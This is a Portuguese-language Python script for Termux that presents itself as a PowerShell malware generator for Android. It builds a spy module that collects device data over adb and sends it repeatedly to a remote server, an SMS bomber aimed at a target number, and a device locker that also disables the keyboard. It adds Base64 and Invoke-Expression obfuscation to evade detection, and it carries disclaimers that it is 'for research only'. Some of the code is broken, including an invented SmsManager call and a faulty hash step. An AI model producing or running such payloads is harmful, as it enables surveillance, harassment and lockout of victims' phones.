#!/data/data/com.termux/files/usr/bin/python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import random
import base64
import hashlib
from typing import Dict, List, Optional

# Interface colorida
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.prompt import Prompt, Confirm, IntPrompt
from rich.progress import Progress
from rich.syntax import Syntax

console = Console()

class GeradorPayloadsPowerShellAndroid:
    def __init__(self):
        self.payloads = {
            'android_spy': {
                'function': self.gerar_android_spy,
                'danger_level': 'high',
                'description': 'Coleta informações do dispositivo Android'
            },
            'sms_bomber': {
                'function': self.gerar_sms_bomber,
                'danger_level': 'medium',
                'description': 'Envio em massa de SMS (requer permissões)'
            },
            'lock_device': {
                'function': self.gerar_lock_device,
                'danger_level': 'critical',
                'description': 'Bloqueia o dispositivo remotamente'
            }
        }
        
        self.tecnicas_ofuscacao = {
            'encode': 'Codificação Base64',
            'string': 'Fragmentação de strings',
            'junk': 'Inserção de código inútil',
            'var': 'Ofuscação de variáveis'
        }
        
        self.banners = [
            self._gerar_banner_android_psh(),
            self._gerar_banner_cyber_ghost(),
            self._gerar_banner_dark_android()
        ]
        
        self._verificar_dependencias()
    
    def _gerar_banner_android_psh(self) -> str:
        return """
[bold green]
   _____  _______ ____  _____  _____   _____ _______ ______ _    _ 
  / ____|/ / ____|  _ \|  __ \|  __ \ / ____|__   __|  ____| |  | |
 | (___ / / |  __| |_) | |  | | |__) | (___    | |  | |__  | |__| |
  \___ \ / /| |_ |  _ <| |  | |  _  / \___ \   | |  |  __| |  __  |
  ____) / /_|  _|| |_) | |__| | | \ \ ____) |  | |  | |____| |  | |
 |_____/____|_|  |____/|_____/|_|  \_\_____/   |_|  |______|_|  |_|
[/bold green]
[bold white on green]       GERADOR DE PAYLOADS POWERSHELL ANDROID - DARK EDITION[/bold white on green]
[bold yellow]       CUIDADO: USO ILEGAL PODE RESULTAR EM BANIMENTO DA GOOGLE PLAY[/bold yellow]
"""
    
    def _gerar_banner_cyber_ghost(self) -> str:
        return """
[bold cyan]
  ██████╗██╗   ██╗██████╗ ███████╗██████╗     ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗
 ██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗    ██╔══██╗██║  ██║██╔═══██╗██╔════╝╚══██╔══╝
 ██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝    ██████╔╝███████║██║   ██║███████╗   ██║   
 ██║       ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗    ██╔═══╝ ██╔══██║██║   ██║╚════██║   ██║   
 ╚██████╗   ██║   ██║  ██║███████╗██║  ██║    ██║     ██║  ██║╚██████╔╝███████║   ██║   
  ╚═════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝    ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝   
[/bold cyan]
[bold black on cyan]       GERADOR DE PAYLOADS PS1 PARA ANDROID - CYBER GHOST EDITION[/bold black on cyan]
[bold red]       AVISO: ESTES SCRIPTS PODEM VIOLAR TERMOS DE SERVIÇO[/bold red]
"""
    
    def _gerar_banner_dark_android(self) -> str:
        return """
[bold red]
 █████╗ ███╗   ██╗██████╗  ██████╗ ██╗██████╗     ██████╗ ███████╗██╗    ██╗███████╗██████╗ 
██╔══██╗████╗  ██║██╔══██╗██╔═══██╗██║██╔══██╗    ██╔══██╗██╔════╝██║    ██║██╔════╝██╔══██╗
███████║██╔██╗ ██║██║  ██║██║   ██║██║██║  ██║    ██║  ██║█████╗  ██║ █╗ ██║█████╗  ██████╔╝
██╔══██║██║╚██╗██║██║  ██║██║   ██║██║██║  ██║    ██║  ██║██╔══╝  ██║███╗██║██╔══╝  ██╔══██╗
██║  ██║██║ ╚████║██████╔╝╚██████╔╝██║██████╔╝    ██████╔╝███████╗╚███╔███╔╝███████╗██║  ██║
╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝  ╚═════╝ ╚═╝╚═════╝     ╚═════╝ ╚══════╝ ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝
[/bold red]
[bold white on red]       GERADOR DE MALWARE POWERSHELL PARA ANDROID - NIGHTMARE EDITION[/bold white on red]
[bold yellow]       ALERTA: USO NÃO AUTORIZADO PODE TER CONSEQUÊNCIAS LEGAIS[/bold yellow]
"""
    
    def _verificar_dependencias(self):
        try:
            from rich import print
        except ImportError:
            console.print("[red]Erro: Biblioteca 'rich' não encontrada[/red]")
            if Confirm.ask("Instalar automaticamente?"):
                os.system("pip install rich")
    
    def mostrar_banner(self):
        console.print(random.choice(self.banners))
        console.print(Panel.fit(
            "[blink bold red]⚠️ ATENÇÃO: ESTE SOFTWARE É APENAS PARA PESQUISA DE SEGURANÇA! ⚠️[/blink bold red]",
            style="red on black"
        ))
        time.sleep(1)
    
    def mostrar_menu_principal(self):
        while True:
            console.clear()
            self.mostrar_banner()
            
            tabela = Table(
                title="[bold cyan]🔧 MENU PRINCIPAL (POWERSHELL ANDROID)[/bold cyan]",
                show_header=True,
                header_style="bold magenta"
            )
            tabela.add_column("Opção", style="cyan", width=10)
            tabela.add_column("Payload", style="green")
            tabela.add_column("Perigo", style="red")
            tabela.add_column("Descrição")
            
            for i, (nome, dados) in enumerate(self.payloads.items(), 1):
                perigo = {
                    'high': '🔥 ALTO',
                    'medium': '⚠️ MÉDIO',
                    'critical': '💀 CRÍTICO'
                }.get(dados['danger_level'], '')
                tabela.add_row(
                    str(i),
                    nome,
                    perigo,
                    dados['description']
                )
            
            tabela.add_row("0", "Técnicas", "", "Opções de ofuscação")
            tabela.add_row("9", "Sair", "", "Encerrar o programa")
            
            console.print(tabela)
            
            escolha = Prompt.ask(
                "[blink yellow]➤[/blink yellow] Selecione",
                choices=[str(i) for i in range(0, len(self.payloads)+1)] + ['9'],
                show_choices=False
            )
            
            if escolha == "1":
                self._processar_payload('android_spy')
            elif escolha == "2":
                self._processar_payload('sms_bomber')
            elif escolha == "3":
                self._processar_payload('lock_device')
            elif escolha == "0":
                self._mostrar_menu_tecnicas()
            elif escolha == "9":
                self._sair()
    
    def _mostrar_menu_tecnicas(self):
        while True:
            console.clear()
            console.print(Panel.fit(
                "[bold cyan]⚙️ TÉCNICAS DE OFUSCAÇÃO (POWERSHELL)[/bold cyan]",
                border_style="cyan"
            ))
            
            tabela = Table(show_header=True, header_style="bold blue")
            tabela.add_column("ID", style="cyan", width=5)
            tabela.add_column("Técnica", style="green")
            tabela.add_column("Descrição")
            
            for i, (codigo, desc) in enumerate(self.tecnicas_ofuscacao.items(), 1):
                tabela.add_row(str(i), desc, self._descricao_tecnica(codigo))
            
            console.print(tabela)
            
            escolha = Prompt.ask(
                "[blink yellow]➤[/blink yellow] Selecione (0 para voltar)",
                choices=[str(i) for i in range(0, len(self.tecnicas_ofuscacao)+1)],
                show_choices=False
            )
            
            if escolha == "0":
                return
    
    def _descricao_tecnica(self, codigo: str) -> str:
        descricoes = {
            'encode': "Codifica o script em Base64 para evitar detecção",
            'string': "Divide strings em partes menores e reconstrói em runtime",
            'junk': "Adiciona código inútil para dificultar análise",
            'var': "Substitui nomes de variáveis por aleatórios"
        }
        return descricoes.get(codigo, "Sem descrição disponível")
    
    def _processar_payload(self, nome_payload: str):
        payload_data = self.payloads[nome_payload]
        
        if payload_data['danger_level'] in ['high', 'critical']:
            console.print(Panel.fit(
                "[blink bold red]⚠️ PERIGO ELEVADO ⚠️[/blink bold red]\n"
                "Este payload pode violar políticas de segurança e privacidade.\n"
                "Use apenas em dispositivos próprios ou com autorização!",
                border_style="red"
            ))
            
            if not Confirm.ask("Confirmar criação?", default=False):
                return
        
        config = self._configurar_payload(nome_payload)
        if config is None:
            return
        
        ofuscar = Confirm.ask("Aplicar técnicas de ofuscação?")
        tecnicas = []
        if ofuscar:
            tecnicas = self._selecionar_tecnicas_ofuscacao()
        
        with Progress() as progress:
            task = progress.add_task("[red]Gerando script PowerShell...[/red]", total=100)
            
            payload = payload_data['function'](**config)
            progress.update(task, advance=40)
            
            if ofuscar:
                for tecnica in tecnicas:
                    payload = self._ofuscar_codigo_psh(payload, tecnica)
                    progress.update(task, advance=20)
            
            progress.update(task, completed=100)
        
        self._preview_payload(payload)
        self._salvar_payload(nome_payload, payload)
    
    def _configurar_payload(self, nome_payload: str) -> Optional[Dict]:
        config = {}
        
        if nome_payload == 'android_spy':
            console.print(Panel.fit(
                "[bold]Configuração Android Spy[/bold]",
                border_style="blue"
            ))
            config['server'] = Prompt.ask(
                "[yellow]?[/yellow] Servidor para envio dos dados",
                default="http://seuservidor.com/api/collect"
            )
            config['interval'] = IntPrompt.ask(
                "[yellow]?[/yellow] Intervalo de coleta (minutos)",
                default=10
            )
        
        elif nome_payload == 'sms_bomber':
            console.print(Panel.fit(
                "[bold red]Configuração SMS Bomber[/bold red]",
                border_style="red"
            ))
            config['numero'] = Prompt.ask(
                "[yellow]?[/yellow] Número de telefone alvo",
                default="+5511999999999"
            )
            config['mensagem'] = Prompt.ask(
                "[yellow]?[/yellow] Mensagem a ser enviada",
                default="TESTE DE SMS"
            )
            config['vezes'] = IntPrompt.ask(
                "[yellow]?[/yellow] Quantidade de envios",
                default=100
            )
        
        elif nome_payload == 'lock_device':
            console.print(Panel.fit(
                "[blink bold red]Configuração Lock Device[/blink bold red]",
                border_style="red"
            ))
            config['senha'] = Prompt.ask(
                "[yellow]?[/yellow] Senha para desbloqueio (deixe vazio para sem senha)",
                default="123456",
                show_default=False
            )
            config['mensagem'] = Prompt.ask(
                "[yellow]?[/yellow] Mensagem a ser exibida",
                default="Dispositivo bloqueado por segurança"
            )
        
        console.print("\n[bold]Resumo:[/bold]")
        for chave, valor in config.items():
            console.print(f"  [cyan]{chave}:[/cyan] {valor}")
        
        if not Confirm.ask("Confirmar configurações?"):
            return None
        
        return config
    
    def _selecionar_tecnicas_ofuscacao(self) -> List[str]:
        console.print("\n[bold]Técnicas de Ofuscação:[/bold]")
        tabela = Table(show_header=True, header_style="bold magenta")
        tabela.add_column("ID", style="cyan", width=5)
        tabela.add_column("Técnica", style="green")
        
        for i, (codigo, desc) in enumerate(self.tecnicas_ofuscacao.items(), 1):
            tabela.add_row(str(i), desc)
        
        console.print(tabela)
        
        escolhas = Prompt.ask(
            "[yellow]?[/yellow] Selecione as técnicas (separadas por vírgula)",
            default="1,3"
        )
        
        return [list(self.tecnicas_ofuscacao.keys())[int(x)-1] for x in escolhas.split(',')]
    
    def _preview_payload(self, payload: str):
        console.print(Panel.fit(
            "[bold]PRÉ-VISUALIZAÇÃO DO SCRIPT POWERSHELL[/bold]",
            border_style="yellow"
        ))
        
        lines = payload.split('\n')[:20]
        code = '\n'.join(lines)
        
        console.print(Syntax(code, "powershell", theme="monokai", line_numbers=True))
        
        if len(payload.split('\n')) > 20:
            console.print("[yellow]... (truncado, mostrando apenas as primeiras 20 linhas)[/yellow]")
    
    def _salvar_payload(self, nome_payload: str, payload: str):
        nome_arquivo = Prompt.ask(
            "[yellow]?[/yellow] Nome do arquivo PowerShell",
            default=f"payload_{nome_payload}.ps1"
        )
        
        try:
            with open(nome_arquivo, 'w', encoding='utf-8') as f:
                f.write(payload)
            
            with open(nome_arquivo, 'rb') as f:
                md5 = hashlib.md5(f.read()).hexdigest()
                sha256 = hashlib.sha256(f.read()).hexdigest()
            
            console.print(Panel.fit(
                f"[green]✓ Arquivo salvo como [bold]{nome_arquivo}[/bold][/green]\n"
                f"[cyan]MD5: [bold]{md5}[/bold][/cyan]\n"
                f"[cyan]SHA256: [bold]{sha256}[/bold][/cyan]\n\n"
                f"[yellow]Para executar no Termux:[/yellow]\n"
                f"[white]pwsh -ExecutionPolicy Bypass -File {nome_arquivo}[/white]",
                title="[bold green]SUCESSO[/bold green]",
                border_style="green"
            ))
            
        except Exception as e:
            console.print(Panel.fit(
                f"[red]✗ Erro: {str(e)}[/red]",
                title="[bold red]ERRO[/bold red]",
                border_style="red"
            ))
        
        input("\nPressione Enter para continuar...")
    
    def _ofuscar_codigo_psh(self, payload: str, tecnica: str) -> str:
        if tecnica == 'encode':
            return self._ofuscar_com_base64(payload)
        elif tecnica == 'string':
            return self._fragmentar_strings(payload)
        elif tecnica == 'junk':
            return self._adicionar_codigo_lixo_psh(payload)
        elif tecnica == 'var':
            return self._ofuscar_variaveis(payload)
        return payload
    
    def _ofuscar_com_base64(self, payload: str) -> str:
        encoded = base64.b64encode(payload.encode('utf-16le')).decode()
        return f"$script = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('{encoded}')); Invoke-Expression $script"
    
    def _fragmentar_strings(self, payload: str) -> str:
        # Fragmenta strings maiores que 10 caracteres
        lines = payload.split('\n')
        for i in range(len(lines)):
            if '="' in lines[i] or ' "' in lines[i]:
                parts = lines[i].split('"')
                for j in range(1, len(parts), 2):
                    if len(parts[j]) > 10:
                        fragments = [parts[j][k:k+3] for k in range(0, len(parts[j]), 3)]
                        new_str = '" + "'.join(fragments)
                        parts[j] = new_str
                lines[i] = '"'.join(parts)
        return '\n'.join(lines)
    
    def _adicionar_codigo_lixo_psh(self, payload: str) -> str:
        junk_code = [
            "Start-Sleep -Milliseconds 100",
            "$null = [System.GC]::Collect()",
            "$junkVar = " + str(random.randint(1000,9999)),
            "if($false) { Write-Host 'Never executed' }"
        ]
        
        lines = payload.split('\n')
        for i in range(len(lines)-1, 0, -1):
            if random.random() > 0.7 and lines[i].strip() and not lines[i].strip().startswith('#'):
                lines.insert(i, random.choice(junk_code))
        
        return '\n'.join(lines)
    
    def _ofuscar_variaveis(self, payload: str) -> str:
        vars = set()
        lines = payload.split('\n')
        
        # Encontra todas as variáveis
        for line in lines:
            if '$' in line:
                var = line.split('$')[1].split()[0]
                if var.isidentifier():
                    vars.add(var)
        
        # Substitui por nomes aleatórios
        replacements = {}
        for var in vars:
            replacements[var] = '$' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(8,12)))
        
        # Aplica as substituições
        for old, new in replacements.items():
            payload = payload.replace(f'${old}', new)
        
        return payload
    
    # Implementações dos payloads PowerShell para Android
    def gerar_android_spy(self, server: str, interval: int, **kwargs) -> str:
        return f"""# Android Spy Module (PowerShell)
# Coleta informações do dispositivo e envia para {server}

function Get-AndroidInfo {{
    $info = @{{}}
    
    # Informações básicas
    $info.Device = adb shell getprop ro.product.model
    $info.OSVersion = adb shell getprop ro.build.version.release
    $info.Manufacturer = adb shell getprop ro.product.manufacturer
    $info.SerialNumber = adb shell getprop ro.serialno
    
    # Informações de rede
    $info.WiFi = adb shell ip addr show wlan0 | Select-String "inet\\s"
    $info.IPPublic = (Invoke-RestMethod -Uri "https://api.ipify.org").Trim()
    
    # Informações de armazenamento
    $info.Storage = adb shell df -h
    
    # Aplicações instaladas
    $info.Apps = adb shell pm list packages -f
    
    return $info
}}

while($true) {{
    try {{
        $data = Get-AndroidInfo
        $json = $data | ConvertTo-Json -Depth 5
        
        # Envia dados para o servidor
        Invoke-RestMethod -Uri "{server}" -Method Post -Body $json -ContentType "application/json"
    }} catch {{
        Write-Error "Erro na coleta: $_"
    }}
    
    # Aguarda intervalo
    Start-Sleep -Seconds {interval * 60}
}}"""
    
    def gerar_sms_bomber(self, numero: str, mensagem: str, vezes: int, **kwargs) -> str:
        return f"""# SMS Bomber (PowerShell)
# Envia {vezes} SMS para {numero}

function Send-SMS {{
    param(
        [string]$phoneNumber,
        [string]$message
    )
    
    $smsManager = [Android.Telephony.SmsManager]::Default
    $smsManager.SendTextMessage($phoneNumber, $null, $message, $null, $null)
}}

# Requer permissões no AndroidManifest.xml:
# <uses-permission android:name="android.permission.SEND_SMS" />

for($i=1; $i -le {vezes}; $i++) {{
    try {{
        Send-SMS -phoneNumber "{numero}" -message "{mensagem} ($i/$vezes)"
        Write-Host "SMS $i enviado para {numero}"
        Start-Sleep -Milliseconds 500
    }} catch {{
        Write-Error "Falha ao enviar SMS: $_"
    }}
}}"""
    
    def gerar_lock_device(self, senha: str, mensagem: str, **kwargs) -> str:
        lock_cmd = f"adb shell am start -a android.intent.action.MAIN -n com.android.settings/.ChooseLockGeneric --ez confirm_credentials false --es password '{senha}' --es message '{mensagem}'" if senha else \
                   "adb shell input keyevent 26"
        
        return f"""# Android Device Locker (PowerShell)
# Bloqueia o dispositivo com a mensagem: "{mensagem}"

# Requer permissões ADB e depuração USB ativada

try {{
    # Bloqueia a tela
    {lock_cmd}
    
    # Desabilita o teclado (opcional)
    adb shell ime disable com.android.inputmethod.latin/.LatinIME
    
    Write-Host "Dispositivo bloqueado com sucesso!"
}} catch {{
    Write-Error "Falha ao bloquear dispositivo: $_"
}}"""
    
    def _sair(self):
        console.print(Panel.fit(
            "[blink bold red]⚠️ ATENÇÃO: O USO INADEQUADO PODE VIOLAR LEIS DE PRIVACIDADE! ⚠️[/blink bold red]",
            border_style="red"
        ))
        console.print("[cyan]Saindo...[/cyan]")
        time.sleep(1)
        sys.exit(0)

def main():
    try:
        gerador = GeradorPayloadsPowerShellAndroid()
        gerador.mostrar_menu_principal()
    except KeyboardInterrupt:
        console.print("\n[red]✗ Cancelado pelo usuário[/red]")
        sys.exit(0)
    except Exception as e:
        console.print(f"\n[red]✗ Erro fatal: {str(e)}[/red]")
        sys.exit(1)

if __name__ == '__main__':
    main()
